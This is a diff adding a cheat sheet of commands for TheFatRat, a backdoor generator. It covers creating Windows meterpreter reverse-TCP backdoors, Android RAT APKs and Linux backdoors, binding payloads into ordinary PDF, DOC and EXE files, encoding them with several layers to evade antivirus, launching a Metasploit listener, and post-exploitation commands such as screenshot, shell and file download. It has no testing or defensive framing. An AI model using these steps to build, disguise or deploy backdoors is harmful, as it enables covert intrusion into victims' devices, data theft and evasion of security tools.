@@ -1,0 +1,69 @@
+=================================
+TheFatRat - Common CLI Commands
+=================================
+
+1. Starting TheFatRat
+------------------------
+sudo ./fatrat               # Start TheFatRat (from its directory)
+sudo fatrat                 # If globally installed
+
+2. Payload Creation
+------------------------
+# Create a payload using msfvenom via TheFatRat:
+[From menu interface - select corresponding option for each]
+- Windows backdoor with meterpreter reverse TCP
+- Android RAT APK
+- Linux backdoor
+
+3. Creating Windows Payload (Meterpreter)
+------------------------------------------
+Select 1 or 2 in the menu (depends on version)
+Set:
+    LHOST = <your IP>
+    LPORT = <your port>
+    Output = backdoor.exe
+
+4. Creating Android Payload
+-----------------------------
+Select option for "Android Backdoor"
+Set LHOST and LPORT
+Generated file: backdoor.apk
+
+5. Embedding Payload in Original File
+---------------------------------------
+- Use original PDF/DOC/EXE to embed payload
+- File becomes: binded_output.exe or similar
+
+6. Setting Up a Listener
+-------------------------
+- TheFatRat auto-generates Metasploit RC file
+- To launch listener:
+msfconsole -r /path/to/generated/file.rc
+
+7. Encoding Payloads (Evading AV)
+------------------------------------
+- Choose option to encode with multiple layers (upx, shikata_ga_nai)
+- Set number of iterations
+- Test with AV tools
+
+8. Post Exploitation (via Meterpreter)
+----------------------------------------
+- Once payload connects, use:
+sysinfo
+getuid
+screenshot
+shell
+download <file>
+upload <file>
+
+9. Cleaning Up
+----------------
+rm -rf backdoor.*
+rm -rf /path/to/generated/rc_file.rc
+
+10. Updating TheFatRat
+------------------------
+cd /path/to/fatrat
+git pull origin master
+chmod +x setup.sh && sudo ./setup.sh
+
